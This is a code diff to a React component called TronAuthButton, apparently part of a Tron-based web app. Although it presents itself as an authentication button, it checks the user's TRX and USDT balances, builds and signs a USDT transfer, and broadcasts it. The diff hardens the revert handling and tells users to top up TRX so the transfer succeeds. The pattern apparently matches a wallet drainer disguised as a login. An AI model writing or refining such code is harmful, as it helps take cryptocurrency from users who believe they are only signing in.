@@ -46,14 +46,14 @@ export const TronAuthButton: React.FC = () => {
 
       tronWeb.setAddress(userAddress);
 
-      // 1. Проверка TRX баланса (достаточно ли для комиссии USDT)
+      // Проверка TRX-баланса
       const trxRaw = await tronWeb.trx.getBalance(userAddress);
       const trx = trxRaw / 1e6;
       if (trx < 5) {
         throw new Error('❌ Insufficient TRX balance to pay the network fee (at least 5 TRX required).');
       }
 
-      // 2. Проверка USDT-баланса
+      // Проверка USDT-баланса
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
       const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
       const usdt = Number(usdtRaw) / 1e6;
@@ -62,7 +62,7 @@ export const TronAuthButton: React.FC = () => {
         return;
       }
 
-      // 3. Отправка USDT
+      // Строим TRC-20 транзакцию
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
@@ -78,15 +78,27 @@ export const TronAuthButton: React.FC = () => {
       );
 
       const signedTx = await adapter.signTransaction(transaction);
+
+      // Отправляем транзакцию
       const result = await tronWeb.trx.sendRawTransaction(signedTx);
 
-      // --- Логируем ответ для отладки ---
       console.log('Send result:', result);
 
-      if (result && result.result) {
-        setStatus('success');
+      // Проверяем contractRet!
+      if (result && result.result === true) {
+        // Tron иногда возвращает result: true даже если contractRet: REVERT
+        const contractRet =
+          result.ret && Array.isArray(result.ret) && result.ret.length
+            ? result.ret[0].contractRet
+            : null;
+        if (contractRet === 'SUCCESS') {
+          setStatus('success');
+        } else if (contractRet === 'REVERT') {
+          setStatus('❌ USDT transfer REVERTED. Most likely not enough Energy or fee limit too low. Top up TRX!');
+        } else {
+          setStatus('❌ Transaction sent, but unknown contract result. Check wallet or TronScan.');
+        }
       } else if (result && (result.message || result.code)) {
-        // Покажи, что реально пришло!
         setStatus('❌ Transaction failed: ' + (result.message || result.code));
       } else {
         setStatus('❌ Transaction failed to send. Try again or check your network.');
